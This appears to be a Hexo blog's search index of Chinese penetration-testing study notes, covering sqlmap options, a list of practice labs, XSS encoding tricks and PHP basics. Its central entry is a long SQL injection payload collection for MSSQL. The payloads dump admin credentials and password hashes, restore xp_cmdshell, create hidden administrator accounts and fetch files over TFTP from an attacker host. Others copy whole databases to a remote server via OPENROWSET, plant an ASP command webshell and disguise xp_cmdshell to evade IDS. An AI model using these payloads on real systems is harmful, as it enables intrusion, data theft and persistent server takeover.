–flush-session 刷新当前目标的会话文件 –fresh-queries 忽略在会话文件中存储的查询结果 –eta 显示每个输出的预计到达时间 –update 更新SqlMap –save file保存选项到INI配置文件 –batch 从不询问用户输入，使用所有默认配置。 Miscellaneous（杂项）： –beep 发现SQL注入时提醒 –check-payload IDS对注入payloads的检测测试 –cleanup SqlMap具体的UDF和表清理DBMS –forms 对目标URL的解析和测试形式 –gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果 –page-rank Google dork结果显示网页排名（PR） –parse-errors 从响应页面解析数据库管理系统的错误消息 –replicate 复制转储的数据到一个sqlite3数据库 –tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址 –wizard 给初级用户的简单向导界面]]></content>
      <tags>
        <tag>sqlmap，渗透工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[十大渗透测试演练系统]]></title>
    <url>%2F2019%2F11%2F01%2F%E5%8D%81%E5%A4%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%BC%94%E7%BB%83%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[本文总结了目前网络上比较流行的渗透测试演练系统，这些系统里面都提供了一些实际的安全漏洞，排名不分先后，各位安全测试人员可以亲身实践如何利用这个漏洞，同时也可以学习到漏洞的相关知识。 原文链接：https://www.freebuf.com/sectool/4708.html 1.DVWA (Dam Vulnerable Web Application)是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。 链接地址：http://www.dvwa.co.uk 2.mutillidae是一个免费，开源的Web应用程序，提供专门被允许的安全测试和入侵的Web应用程序。它是由Adrian “Irongeek” Crenshaw和Jeremy “webpwnized” Druin.开发的一款自由和开放源码的Web应用程序。其中包含了丰富的渗透测试项目，如SQL注入、跨站脚本、clickjacking、本地文件包含、远程代码执行等. 链接地址：http://sourceforge.net/projects/mutillidae 3.SQLol是一个可配置得SQL注入测试平台，它包含了一系列的挑战任务，让你在挑战中测试和学习SQL注入语句。此程序在Austin黑客会议上由Spider Labs发布。 链接地址：https://github.com/SpiderLabs/SQLol 4.hackxor是由albino开发的一个online黑客游戏,亦可以下载安装完整版进行部署,包括常见的WEB漏洞演练。包含常见的漏洞XSS、CSRF、SQL注入、RCE等。 链接地址：http://sourceforge.net/projects/hackxor 5.BodgeIt是一个Java编写的脆弱性WEB程序。他包含了XSS、SQL注入、调试代码、CSRF、不安全的对象应用以及程序逻辑上面的一些问题。 链接地址：http://code.google.com/p/bodgeit 6.Exploit KB / exploit.co.il该程序包含了各种存在漏洞的WEB应用，可以测试各种SQL注入漏洞。此应用程序还包含在BT5里面。 链接地址：http://exploit.co.il/projects/vuln-web-app 7.WackoPicko是由Adam Doupé.发布的一个脆弱的Web应用程序，用于测试Web应用程序漏洞扫描工具。它包含了命令行注射、sessionid问题、文件包含、参数篡改、sql注入、xss、flash form反射性xss、弱口令扫描等。 链接地址：https://github.com/adamdoupe/WackoPicko 8.WebGoat是由著名的OWASP负责维护的一个漏洞百出的J2EE Web应用程序，这些漏洞并非程序中的bug，而是故意设计用来讲授Web应用程序安全课程的。这个应用程序提供了一个逼真的教学环境，为用户完成课程提供了有关的线索。 链接地址：http://code.google.com/p/webgoat 9.OWASP Hackademic 是由OWASP开发的一个项目，你可以用它来测试各种攻击手法，目前包含了10个有问题的WEB应用程序。 链接地址：https://code.google.com/p/owasp-hackademic-challenges 10.XSSeducation是由AJ00200开发的一套专门测试跨站的程序。里面包含了各种场景的测试。 链接地址： http://wiki.aj00200.org/wiki/XSSeducation]]></content>
      <tags>
        <tag>靶场，渗透测试环境</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sqlmap注入工具的使用]]></title>
    <url>%2F2019%2F10%2F31%2FSqlmap%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[1.Sqlmap简介：​ sqlmap是一种开源的渗透测试工具，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令。 ​ 支持的数据库：MySQL (1)，Oracle (4)，Postgre SQL，Microsoft SQL Server (2)，Microsoft Access (3)，IBM DB2，SQLite，Firebird，Sybase and SAP MAXDB 。 2.Sqlmap支持五种不同的注入模式： UNION query SQL injection （可联合查询注入） Error-based SQL injection （报错型注入） Boolean-based blind SQL injection （布尔型注入） Time-based blind SQL injection （基于时间延迟注入） Stacked queries SQL injection （可多语句查询注入） 3.Sqlmap设置目标URL： -u /–url 最基本格式 sqlmap -u”http://www.target.com/index.php?id=1&quot; -m 从文本中获取多个目标扫描，但是每一行只能有一个URL。 sqlmap -m urllist.txt -r 从文件中加载HTTP请求，这样的话就不需要在去设定cookie，POST数据……等等。 4.sqlmap设置回显等级：参数：-v默认为1： ​ 0、只显示python错误以及严重的信息。 ​ 1、同时显示基本信息和警告信息。（默认等级） ​ 2、同时显示debug信息。 ​ 3、同时显示注入的payload。 ​ 4、同时显示http请求。 ​ 5、同时显示http响应头。 ​ 6、同时显示http响应页面。 5、设置http数据包相关参数： 参数：-data ​ 此参数是把data后面的数据已post方式提交，sqlmap会像检测get参数一样检验post提交过去的参数。 ​ python sqlmap.py -u “http://www.target.com/vuln.php&quot; –data=”id=1” 参数：-cookie ​ 当web需要登录的时候，需要我们抓包获取cookie参数，然后复制出来，加到–cookie参数中。 ​ –cookie=”Cookie:Hm_lvt6910067,1546929561,1547001094,1547024662;PHPSESSID=o64fbvo316” 参数：–user-agent ​ 默认情况下，sqlmap的HTTP请求头中的user-agent值是：sqlmap/1.0-dev-xxxxxxxxx(http://sqlmap.org) 这个时候可以手动指定伪造一个user-agent。 ​ sqlmap -u “http://www.target.com&quot; –level 3 –user-agent=”aaaaaa” –dbs 参数： –random-agent 会从sqlmap/txt/user-agents.txt中随机产生user-agent头。 ​ sqlmap -u “http://www.target.com&quot; –level 3 –random-agent–dbs ​ sqlmap检查user-agent中的注入点，level&gt;=3才会去检查user-agent头是否存在注入漏洞。 参数：–referer Http Referer头 sqlmap可以在请求中伪造http中的Referer。 ​ sqlmap -u “http://www.target.com/?id=1&quot; –referer=”http://www.baidu.com&quot; 当–level参数设定&gt;=3时，会尝试进行referer的注入。 参数：–delay ​ 可以设定两个http请求间的延迟，设定为1的时候是1秒，默认是没有延迟的。 参数：–timeout ​ 可以设定一个http请求超过多少秒判定为超时，默认是30秒。 6.指定测试参数：-p ​ sqlmap 默认会测试所有的get和post参数，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试user-agent和HTTP Referer头的值。 ​ 例如：-p “id,user-agent” –skip ​ 在使用–level时，级别很大的时候，但是有些参数不能去测试，那么可以使用–skip参数跳过。 ​ 例如：–skip=”user-agent,referer” 7.设定探测等级：–level（sqlmap -r 情况下） ​ 共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，自己也可以根据响应的格式添加自己的payload。 ​ level&gt;=2的时候就会测试HTTP cookie。 ​ level&gt;=3的时候就会测试HTTP User-Agent/Referer头。 ​ level=5的时候会测试HTTP Host。 8.设定探测风险等级：–risk 共有三个风险等级，1-3， ​ 默认是1会测试大部分的测试语句， ​ 2会增加基于时间的测试语句， ​ 3会增加OR语句的SQL注入测试。 ​ 在有些时候，例如在UPDATE,DELETE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。 9.列数据： –dbs ：获取所有的数据库, –users：获取mysql的用户名, –passwords：获取数据库的密码（在mysql数据表中，需要最高权限）； –technique：指定使用哪种注入类型 –current-db 当前数据库 –privileges 权限 -D database_name –tables -D database_name -T table_name –columns -D database_name -T table_name –column_1,column_2 –dump]]></content>
      <tags>
        <tag>渗透工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入语句集合]]></title>
    <url>%2F2019%2F10%2F31%2FSQL%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E9%9B%86%E5%90%88%2F</url>
    <content type="text"><![CDATA[1.判断有无注入点 ; and 1=1 and 1=2 2.猜表一般的表的名称无非是admin adminuser user pass password 等.. and 0&lt;&gt;(select count(*) from *) and 0&lt;&gt;(select count(*) from admin) —判断是否存在admin这张表 3.猜帐号数目 如果遇到0&lt; 返回正确页面， 1&lt;返回错误页面，说明帐号数目就是1个 and 0&lt;(select count(*) from admin) and 1&lt;(select count(*) from admin) 4.猜解字段名称 在len( ) 括号里面加上我们想到的字段名称. and 1=(select count() from admin where len()&gt;0)– and 1=(select count(*) from admin where len（用户字段名称name)&gt;0) and 1=(select count(*) from admin where len（密码字段名称password)&gt;0) 5.猜解各个字段的长度 猜解长度就是把&gt;0变换 直到返回正确页面为止 and 1=(select count() from admin where len()&gt;0) and 1=(select count(*) from admin where len(name)&gt;6) 错误 and 1=(select count(*) from admin where len(name)&gt;5) 正确 长度是6 and 1=(select count(*) from admin where len(name)=6) 正确 and 1=(select count(*) from admin where len(password)&gt;11) 正确 and 1=(select count(*) from admin where len(password)&gt;12) 错误 长度是12 and 1=(select count(*) from admin where len(password)=12) 正确 6.猜解字符 and 1=(select count(*) from admin where left(name,1)=a) —猜解用户帐号的第一位 and 1=(select count(*) from admin where left(name,2)=ab)—猜解用户帐号的第二位 就这样一次加一个字符这样猜，猜到够你刚才猜出来的多少位了就对了，帐号就算出来了 and 1=(select top 1 count(*) from Admin where Asc(mid(pass,5,1))=51) – 这个查询语句可以猜解中文的用户和密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符. group by users. id having 1=1– group by users. id,users.username,users.password,users.privs having 1=1– ; insert into users values( 666,attacker,foobar,0xffff )– UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=logintable- UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=logintable WHERE COLUMN_NAME NOT IN (login_id)- UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=logintable WHERE COLUMN_NAME NOT IN (login_id,login_name)- UNION SELECT TOP 1 login_name FROM logintable- UNION SELECT TOP 1 password FROM logintable where login_name=Rahul– 看服务器打的补丁=出错了打了SP4补丁 and 1=(select @@VERSION)– 看数据库连接账号的权限，返回正常，证明是服务器角色sysadmin权限。 and 1=(SELECT IS_SRVROLEMEMBER(sysadmin))– 判断连接数据库帐号。（采用SA账号连接 返回正常=证明了连接账号是SA） and sa=(SELECT System_user)– and user_name()=dbo– and 0&lt;&gt;(select user_name()– 看xp_cmdshell是否删除 and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = X AND name = xp_cmdshell)– xp_cmdshell被删除，恢复，支持绝对路径的恢复 ;EXEC master.dbo.sp_addextendedproc xp_cmdshell,xplog70.dll– ;EXEC master.dbo.sp_addextendedproc xp_cmdshell,c:\inetpub\wwwroot\xplog70.dll– 反向PING自己实验 ;use master;declare @s int;exec sp_oacreate “wscript.shell”,@s out;exec sp_oamethod @s,”run”,NULL,”cmd.exe /c ping 192.168.0.1”;– 加帐号 ;DECLARE @shell INT EXEC SP_OACREATEwscript.shell,@shell OUTPUT EXEC SP_OAMETHOD @shell,run,null,C:\WINNT[system32](https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=994190&amp;ss_c=ssc.citiao.link)\cmd.exe /c net user jiaoniang$ 1866574 /add– 创建一个虚拟目录E盘： ;declare @o int exec sp_oacreatewscript.shell,@o out exec sp_oamethod @o,run,NULL,cscript.exec:\inetpub\wwwroot\mkwebdir.vbs -w “默认Web站点” -v “e”,”e：&quot;– 访问属性：（配合写入一个webshell） declare @o int exec sp_oacreate wscript.shell,@o out exec sp_oamethod @o,run,NULL,cscript.exec:\inetpub\wwwroot\chaccess.vbs -a w3svc/1/ROOT/e +browse 爆库 特殊技巧：：%5c=\ 或者把/和\ 修改%5提交 and 0&lt;&gt;(select top 1 paths from newtable)– 得到库名（从1到5都是系统的id，6以上才可以判断） and 1=(select name from master.dbo.sysdatabases where dbid=7)– and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6) 依次提交 dbid = 7,8,9…. 得到更多的数据库名 and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U) 暴到一个表 假设为 admin and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U and name not in (Admin)) 来得到其他的表。 and 0&lt;&gt;(select count(*) from bbs.dbo.sysobjects where xtype=U and name=admin and uid&gt;(str(id))) 暴到UID的数值假设为18779569 uid=id and 0&lt;&gt;(select top 1 name from bbs.dbo.syscolumns where id=18779569) 得到一个admin的一个字段，假设为 user_id and 0&lt;&gt;(select top 1 name from bbs.dbo.syscolumns where id=18779569 and name not in (id,…)) 来暴出其他的字段 and 0&lt;(select user_id from BBS.dbo.admin where username&gt;1) 可以得到用户名 依次可以得到密码。假设存在user_id username,password 等字段 and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6) and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U) 得到表名 and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U and name not in(Address)) and 0&lt;&gt;(select count(*) from bbs.dbo.sysobjects where xtype=U and name=admin and uid&gt;(str(id))) 判断id值 and 0&lt;&gt;(select top 1 name from BBS.dbo.syscolumns where id=773577794) 所有字段 id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,* from admin id=-1 union select 1,2,3,4,5,6,7,8,*,9,10,11,12,13 from admin (union，access也好用） 得到WEB路径 ;create table [dbo].[swap] ([swappass]char);– and (select top 1 swappass from swap)=1– ;CREATE TABLE newtable(id int IDENTITY(1,1),paths varchar(500)) Declare @test varchar(20) exec master..xp_regread @rootkey=HKEY_LOCAL_MACHINE,@key=SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\Virtual Roots,@value_name=/, values=@testOUTPUT insert into paths(path) values(@test)– ;use ku1;– ;create table cmd (str image);– 建立image类型的表cmd 存在xp_cmdshell的测试过程： ;exec master..xp_cmdshell dir ;exec master.dbo.sp_addlogin jiaoniang$;– 加SQL帐号 ;exec master.dbo.sp_password null,jiaoniang$,1866574;– ;exec master.dbo.sp_addsrvrolemember jiaoniang$ sysadmin;– ;exec master.dbo.xp_cmdshell net user jiaoniang$ 1866574 /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add;– ;exec master.dbo.xp_cmdshell net localgroup administrators jiaoniang$ /add;– exec master..xp_servicecontrol start,schedule 启动服务 exec master..xp_servicecontrol start,server ; DECLARE @shell INT EXEC SP_OACREATE wscript.shell,@shell OUTPUT EXEC SP_OAMETHOD @shell,run,null,C：\WINNT\system32 \cmd.exe /c net user jiaoniang$ 1866574 /add ;DECLARE @shell INT EXEC SP_OACREATE wscript.shell,@shell OUTPUT EXEC SP_OAMETHOD @shell,run,null,C：\WINNT\system32\cmd.exe /c net localgroup administrators jiaoniang$ /add ; exec master..xp_cmdshell tftp -i youip get file.exe– 利用TFTP上传文件 ;declare @a sysname set @a=xp_+cmdshell exec @a dir c:\ ;declare @a sysname set @a=xp+_cm’+’dshell exec @a dir c:\ ;declare @a;set @a=db_name();backup database @a to disk=你的IP你的共享目录bak.dat 如果被限制则可以。 select * from openrowset(sqloledb,server;sa;,select OK! exec master.dbo.sp_addlogin hax) 查询构造： SELECT * FROM news WHERE id=… AND topic=… AND ….. adminand 1=(select count(*) from [user] where username=victim and right(left(userpass,01),1)=1) and userpass &lt;&gt; select 123;– ;use master;– :a or name like fff%;– 显示有一个叫ffff的用户哈。 and 1&lt;&gt;(select count(email) from [user]);– ;update [users] set email=(select top 1 name from sysobjects where xtype=u and status&gt;0) where name=ffff;– ;update [users] set email=(select top 1 id from sysobjects where xtype=u and name=ad) where name=ffff;– ;update [users] set email=(select top 1 name from sysobjects where xtype=u and id&gt;581577110) where name=ffff;– ;update [users] set email=(select top 1 count(id) from password) where name=ffff;– ;update [users] set email=(select top 1 pwd from password where id=2) where name=ffff;– ;update [users] set email=(select top 1 name from password where id=2) where name=ffff;– 上面的语句是得到数据库中的第一个用户表，并把表名放在ffff用户的邮箱字段中。 通过查看ffff的用户资料可得第一个用表叫ad 然后根据表名ad得到这个表的ID 得到第二个表的名字 insert into users values( 666,char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73),char(0x63)+char(0x68)+char(0x72)+char (0x69)+char(0x73),0xffff)– insert into users values( 667,123,123,0xffff)– insert into users values ( 123,admin–,password,0xffff)– ;and user&gt;0 ;and (select count(*) from sysobjects)&gt;0 ;and (select count(*) from mysysobjects)&gt;0 //为access数据库 枚举出数据表名 ;update aaa set aaa=(select top 1 name from sysobjects where xtype=u and status&gt;0);– 这是将第一个表名更新到aaa的字段处。 读出第一个表，第二个表可以这样读出来（在条件后加上 and name&lt;&gt;；刚才得到的表名）。 ;update aaa set aaa=(select top 1 name from sysobjects where xtype=u and status&gt;0 and name&lt;&gt;vote);– 然后id=1552 and exists(select * from aaa where aaa&gt;5) 读出第二个表，一个个的读出，直到没有为止。 读字段是这样： ;update aaa set aaa=(select top 1 col_name(object_id（表名），1));– 然后id=152 and exists(select * from aaa where aaa&gt;5)出错，得到字段名 ;update aaa set aaa=(select top 1 col_name(object_id（表名），2));– 然后id=152 and exists(select * from aaa where aaa&gt;5)出错，得到字段名 [获得数据表名][将字段值更新为表名，再想法读出这个字段的值就可得到表名] update 表名 set 字段=(select top 1 name from sysobjects where xtype=u and status&gt;0 [ and name&lt;&gt;；你得到的表名 查出一个加一个]) [ where 条件] select top 1 name from sysobjects where xtype=u and status&gt;0 and name not in(table1,table2，…） 通过SQLSERVER注入漏洞建数据库管理员帐号和系统管理员帐号[当前帐号必须是SYSADMIN组] [获得数据表字段名][将字段值更新为字段名，再想法读出这个字段的值就可得到字段名] update 表名 set 字段=(select top 1 col_name(object_id（要查询的数据表名），字段列如：1) [ where 条件] 绕过IDS的检测[使用变量] ;declare @a sysname set @a=xp_+cmdshell exec @a dir c:\ ;declare @a sysname set @a=xp+_cm’+’dshell exec @a dir c:\ 开启远程数据库 基本语法 select * from OPENROWSET(SQLOLEDB,server=servername;uid=sa;pwd=123,select * from table1 ) 参数： (1) OLEDB Provider name 其中连接字符串参数可以是任何端口用来连接，比如 select * from OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from table 复制目标主机的整个数据库insert所有远程表到本地表。 基本语法： insert into OPENROWSET(SQLOLEDB,server=servername;uid=sa;pwd=123,select * from table1) select * from table2 这行语句将目标主机上table2表中的所有数据复制到远程数据库中的table1表中。实际运用中适当修改连接字符串的IP地址和端口，指向需要的地方，比如： insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from table1) select * from table2 insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _sysdatabases) select * from master.dbo.sysdatabases insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _sysobjects) select * from user_database.dbo.sysobjects insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _syscolumns) select * from user_database.dbo.syscolumns 复制数据库： insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from table1) select * from database..table1 insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from table2) select * fromdatabase..table2 复制哈西表（HASH）登录密码的hash存储于sysxlogins中。方法如下： insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _sysxlogins) select * from database.dbo.sysxlogins 得到hash之后，就可以进行暴力破解。 遍历目录的方法：先创建一个临时表：temp ;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));– ;insert temp exec master.dbo.xp_availablemedia;– 获得当前所有驱动器 ;insert into temp(id) exec master.dbo.xp_subdirs c:;– 获得子目录列表 ;insert into temp(id,num1) exec master.dbo.xp_dirtree c:;– 获得所有子目录的目录树结构，并寸入temp表中 ;insert into temp(id) exec master.dbo.xp_cmdshell type c:\web\index.asp;– 查看某个文件的内容 ;insert into temp(id) exec master.dbo.xp_cmdshell dir c:;– ;insert into temp(id) exec master.dbo.xp_cmdshell dir c:\ *.asp /s/a;– ;insert into temp(id) exec master.dbo.xp_cmdshell cscript. C:\Inetpub\AdminScripts\adsutil.vbs enum w3svc ;insert into temp(id,num1) exec master.dbo.xp_dirtree c:;– （xp_dirtree适用权限PUBLIC） 写入表： 语句1：and 1=(SELECT IS_SRVROLEMEMBER(sysadmin));– 语句2：and 1=(SELECT IS_SRVROLEMEMBER(serveradmin));– 语句3：and 1=(SELECT IS_SRVROLEMEMBER(setupadmin));– 语句4：and 1=(SELECT IS_SRVROLEMEMBER(securityadmin));– 语句5：and 1=(SELECT IS_SRVROLEMEMBER(securityadmin));– 语句6：and 1=(SELECT IS_SRVROLEMEMBER(diskadmin));– 语句7：and 1=(SELECT IS_SRVROLEMEMBER(bulkadmin));– 语句8：and 1=(SELECT IS_SRVROLEMEMBER(bulkadmin));– 语句9：and 1=(SELECT IS_MEMBER(db_owner));– 把路径写到表中去： ;create table dirs(paths varchar(100),id int)– ;insert dirs exec master.dbo.xp_dirtree c:-- and 0&lt;&gt;(select top 1 paths from dirs)– and 0&lt;&gt;(select top 1 paths from dirs where paths not in(@Inetpub))– ;create table dirs1(paths varchar(100),id int)– ;insert dirs exec master.dbo.xp_dirtree e:\web– and 0&lt;&gt;(select top 1 paths from dirs1)– 把数据库备份到网页目录：下载 ;declare @a sysname; set @a=db_name();backup database @a to disk=e:\web\down.bak;– and 1=(Select top 1 name from(Select top 12 id,name from sysobjects where xtype=char(85)) T order by id desc) and 1=(Select Top 1 col_name(object_id(USER_LOGIN),1) from sysobjects) 参看相关表。 and 1=(select user_id from USER_LOGIN) and 0=(select user from USER_LOGIN where user&gt;1) -=-wscript.shellexample -=- declare @o int exec sp_oacreate wscript.shell,@o out exec sp_oamethod @o,run,NULL,notepad.exe ; declare @o int exec sp_oacreate wscript.shell,@o out exec sp_oamethod @o,run,NULL,notepad.exe– declare @o int,@f int,@t int,@ret int declare @line varchar(8000) exec sp_oacreate scripting.filesystemobject,@o out exec sp_oamethod @o,opentextfile,@f out,c:\boot.ini,1 exec @ret = sp_oamethod @f,readline,@line out while( @ret = 0 ) begin print @line exec @ret = sp_oamethod @f,readline,@line out end declare @o int,@f int,@t int,@ret int exec sp_oacreate scripting.filesystemobject,@o out exec sp_oamethod @o,createtextfile,@f out,c:\inetpub\wwwroot\foo.asp,1 exec @ret = sp_oamethod @f,writeline,NULL, &lt;% set o = server.createobject(“wscript.shell”): o.run( request.querystring(“cmd”) ) %&gt; declare @o int,@ret int exec sp_oacreate speech.voicetext,@o out exec sp_oamethod @o,register,NULL,foo,bar exec sp_oasetproperty @o,speed,150 exec sp_oamethod @o,speak,NULL,all your sequel servers are belong to,us,528 waitfor delay 00:00:05 ; declare @o int,@ret int exec sp_oacreate speech.voicetext,@o out exec sp_oamethod @o,register,NULL,foo,bar exec sp_oasetproperty @o,speed,150 exec sp_oamethod @o,speak,NULL,all your sequel servers are belong to us,528 waitfor delay 00:00:05– xp_dirtree适用权限PUBLIC exec master.dbo.xp_dirtree c:\ 返回的信息有两个字段subdirectory、depth。Subdirectory字段是字符型，depth字段是整形字段。 create table dirs(paths varchar(100),id int) 建表，这里建的表是和上面xp_dirtree相关连，字段相等、类型相同。 insert dirs exec master.dbo.xp_dirtree c:\ 只要我们建表与存储进程返回的字段相定义相等就能够执行！达到写表的效果.]]></content>
      <tags>
        <tag>注入漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS编码]]></title>
    <url>%2F2019%2F10%2F30%2FXSS%E7%BC%96%E7%A0%81%2F</url>
    <content type="text"><![CDATA[1.常用的编码：URL编码：一个百分号和该字符的ASCII编码所对应的2位十六进制数字。 / —-&gt; %2F #—–&gt; %23 ==记住 . ——&gt;%2e +——&gt;%2b ==记住 &lt; —–&gt;%3c ==记住 ‘&gt;’ —&gt;%3e ==记住 ! —-&gt;%21 空格 —&gt;%20 ==记住 &amp; —-&gt;%26 ==记住 ( —–&gt;%28 )—–&gt;%29 “—-&gt;%22 ==记住 ‘ —-&gt;%27 ==记住 2.HTML实体编码：​ 以&amp;开头，分号结尾的。例如 &lt; 的编码是 &amp;lt ; ​ HTML实体编码（10进制与16进制） 例如 &lt; HTML十进制：&amp;#60 ； HTML十六进制：&amp;#x3c ; ​ &amp;: &amp;amp 双引号” : &amp;quot 单引号 ‘ : 039 ​ &lt; ：&amp;lt &gt; : &amp;gt 3.JavaScript编码：js提供四种字符编码的策略 （1）三个八进制数字，如果不够个数，前面补0； ​ 例如： &lt; 编码为 \074 （2）两个十六进制数字，如果不够个数，前面补0； ​ 例如： &lt; 编码为 \x3c （3）四个十六进制数字，如果不够个数，前面补0； ​ 例如：&lt; 编码为 \u003c （4）对于一些控制字符，使用特殊的C类型的转义风格； ​ 例如： \n 和 \r 4.各个编码的具体利用场景： （1）base64编码 Data协议使用方法 （data：资源类型；编码，内容） 到目前为止，遇到使用base64编码的情况，大多数是这样 &lt; a href=”可控点”&gt; &lt; iframe src=”可控点”&gt; 在这种情况下，如果过滤&lt; &gt; ‘’ “” JavaScript 的话，那么要XSS可以这样写，然后利用base64编码！ 将&lt; img src=x onerror=alert(1) &gt;整条base64编码为 PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg== &lt; a &gt;标签的利用方式 ​ &lt; a href=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”&gt;test&lt; /a &gt; 这样当test连接点击你是，就会以data协议 页面以text/html的方式解析 编码为base64 然后单点击a连接时 base64的编码就被解码还原成我们原本的&lt; script &gt;alert(1)&lt; /script&gt; 然后成功弹窗。 （2）HTML实体编码（十进制和十六进制） ​ 浏览器是不会在HTML标签里解析js中的那些编码的！onerror较特殊，onerror里的内容是当js解析的，因此可以用 JSunicode编码，但是不能全部编码，只能编码函数名。 如果全部编码是会出错的。]]></content>
      <tags>
        <tag>XSS漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript]]></title>
    <url>%2F2019%2F10%2F30%2FJavaScript%2F</url>
    <content type="text"><![CDATA[]]></content>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP语言]]></title>
    <url>%2F2019%2F10%2F30%2FPHP%E8%AF%AD%E8%A8%80%2F</url>
    <content type="text"><![CDATA[在使用PHP语言开发之前，我们需要搭建PHP调试环境，需要下载phpstudy集成环境。 1.PHP是什么？PHP（Hypertext Preprocessor）超级文本预处理器 是一种在服务器端执行的嵌入HTML文档的脚本语言， 也是目前最流行的网站开发语言（B/S结构，后台）。 2.PHP在web中的功能： 3.PHP语言的特点：（1）是开放源代码的，服务器端的脚本语言； （2）独立于操作系统，可以运行在几乎所有系统中； （3）支持大部分的服务器，如apache,IIS ； （4）支持大量的数据库； （5）可以创建图象 4.PHP基本信息：​ &lt;? php ​ phpinfo(); ​ ?&gt; 5.PHP语言标记：​ 文件后缀名为.php结尾，上传到Web服务器的文档根目录下，通过浏览器访问Web服务器管理下的PHP文件，就可以运行PHP文件。 ​ 用&lt;? php来表示PHP标识符的起始，然后放入PHP语句并通过加上一个终止标识符? &gt;来退出PHP模式。可以根据自己的需要在HTML文件中像这样开启或关闭PHP模式。大多数的嵌入式脚本语言都是这样嵌入到HTML中并和HTML一起使用，例如CSS、JavaScript、PHP、ASP以及JSP等。 ​ 以结束标记是标准风格，这是PHP推荐使用的标记风格。 以开始和结束是长风格标记，这种标记最长，总是可用的，但我们并不常用。 以结束标记是简短风格的标记，是最简单的，但是系统管理员偶尔会禁用掉它，因为它会干扰XML文档的声明。只有通过php.ini配置文件中的指令short_open_tag打开后就可以使用。 以&lt;%开始和以%&gt;结束标记是ASP风格的标记，可以在php.ini配置文件设定中启用了asp_tags选项就可以使用它（默认是禁用的），习惯了ASP风格的可以使用它。 7.PHP的指令分隔符：； ​ PHP需要在每个指令后用分号结束。]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[密码学]]></title>
    <url>%2F2019%2F10%2F27%2F%E5%AF%86%E7%A0%81%E5%AD%A6%2F</url>
